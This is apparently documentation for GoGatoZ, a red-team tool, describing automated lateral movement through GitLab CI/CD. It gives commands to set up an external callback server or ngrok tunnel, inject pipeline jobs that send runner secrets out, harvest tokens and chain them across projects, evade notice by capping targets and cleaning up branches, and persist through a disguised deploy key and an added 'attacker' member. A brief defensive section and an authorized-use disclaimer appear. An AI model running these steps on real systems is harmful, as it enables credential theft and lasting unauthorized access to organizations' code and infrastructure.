---
title: Lateral Movement
description: Automated token harvesting and pivoting through CI/CD pipelines
---

This guide covers using GoGatoZ's pivot command to chain CI/CD exploitation into automated lateral movement across a GitLab instance.

> **Note**: This guide is intended for authorized security testing only. Always ensure you have proper permission.

## The Pivot Chain

Traditional CI/CD security testing is linear: find a vulnerability, exploit it, report it. The pivot command turns this into an automated chain:

```
Token A → enumerate → find VARIABLE_INJECTION in project X
       → attack project X (exfil secrets)
       → harvest Token B from CI variables
       → Token B → enumerate → find PLAINTEXT_SECRET in project Y
                 → attack project Y (exfil secrets)
                 → harvest Token C from CI variables
                 → Token C → ...
```

Each depth level can discover tokens with different scopes, groups, and access levels — potentially reaching systems the original token could never access.

![Pivot gateway pipeline — exfiltration job injected at BFS depth 0](/images/ctf/09-pivot-gateway-pipeline.png)

![Pivot crown jewels pipeline — the final hop at depth 2, reaching the most sensitive secrets](/images/ctf/10-pivot-crown-pipeline.png)

## Step 1: Reconnaissance

Start with a dry run to understand the attack surface:

```bash
gogatoz pivot -t org/project --dry-run --follow-includes --fetch-runners
```

This shows:
- How many projects are accessible
- Which have exploitable CI/CD vulnerabilities
- What attack vectors are available

## Step 2: Set Up the Callback Server

The pivot command runs its own callback server, but you need to ensure CI runners can reach it.

### Direct (VPS)

If your VPS has a public IP:

```bash
gogatoz pivot -t org/project \
  --external-url https://your-vps.com:9443 \
  --listen :9443
```

### Via Tunnel

If runners are in an isolated network, use a tunnel:

```bash
# Terminal 1: Start tunnel
ngrok http 9443

# Terminal 2: Use the tunnel URL
gogatoz pivot -t org/project \
  --external-url https://abc123.ngrok.io \
  --listen :9443
```

## Step 3: Execute the Pivot

```bash
gogatoz pivot \
  -t org/project1 -t org/project2 \
  --external-url https://your-vps:9443 \
  --max-depth 3 \
  --max-targets 20 \
  --follow-includes \
  --fetch-runners \
  --cleanup \
  --timeout 1h
```

Key flags for a real engagement:
- `--max-depth 3`: Three levels of token pivoting
- `--max-targets 20`: Cap total attacks to stay under the radar
- `--cleanup`: Remove attack branches after harvesting
- `--follow-includes`: Deeper CI analysis for more findings
- `--fetch-runners`: Detect shell executors for severity boosting

## Step 4: Analyze Results

The pivot outputs a summary showing:
- How many projects were enumerated and attacked
- How many credentials were harvested and validated
- What token types were found (PAT, deploy token, project access token)
- The maximum depth reached

Use `--json` for machine-parseable output that integrates with your reporting pipeline.

## Understanding Token Types

Not all tokens are equally useful for pivoting:

| Token Type | Prefix | Pivot Value |
|-----------|--------|-------------|
| Personal Access Token | `glpat-` | High — user-level access to all their projects |
| Deploy Token | `gldt-` | Medium — typically read-only, project-scoped |
| Project Access Token | `glcbt-` | Medium — project-scoped with configurable permissions |
| Runner Token | `glrt-` | Low — runner registration, not API access |
| CI Job Token | `CI_JOB_TOKEN` | Very Low — short-lived, auto-expires |

PATs are the most valuable because they inherit the user's full access scope — a single PAT from a maintainer or admin can unlock dozens of additional projects.

## What Gets Exfiltrated

The exfiltration pipeline dumps the entire environment of the CI runner job. This includes:

- **CI/CD variables**: Project-level, group-level, and instance-level variables injected by GitLab
- **Environment variables**: `PATH`, `HOME`, runner configuration, Docker settings
- **GitLab-provided variables**: `CI_PROJECT_ID`, `CI_PIPELINE_ID`, `CI_JOB_TOKEN`, etc.

The pivot harvester then filters this for token patterns while ignoring noise (PATH, HOME, etc.).

## Defensive Implications

Organizations can defend against pivot attacks by:

1. **Restricting CI variable scope** — Use environment-scoped variables that only inject on specific branches
2. **Protecting branches** — Protected variables only inject on protected branches, which the attacker can't create
3. **Using short-lived tokens** — Project access tokens with expiry dates limit the window of compromise
4. **Monitoring for unusual branches** — Alert on branches named `gogatoz-*` or similar patterns
5. **Network segmentation** — Restrict runner egress to prevent callbacks to external servers
6. **Auditing pipeline runs** — Flag pipelines that dump environment variables or make outbound HTTP requests

## Combining with Other GoGatoZ Features

### Post-pivot persistence

After harvesting a high-privilege token, use the attack command for persistence:

```bash
# Use harvested admin token
export GITLAB_TOKEN=<harvested_token>

# Add a deploy key for persistent access
gogatoz attack -t org/critical-project --deploy-key --key-title "CI/CD Bot"

# Add yourself as a project member
gogatoz attack -t org/critical-project --add-member --member-username attacker
```

### Comprehensive scanning with new tokens

```bash
export GITLAB_TOKEN=<harvested_token>
gogatoz search --max-pages 0 --json | \
  gogatoz enumerate --follow-includes --fetch-runners --json
```

This often reveals entire groups and projects that were invisible with the original token.
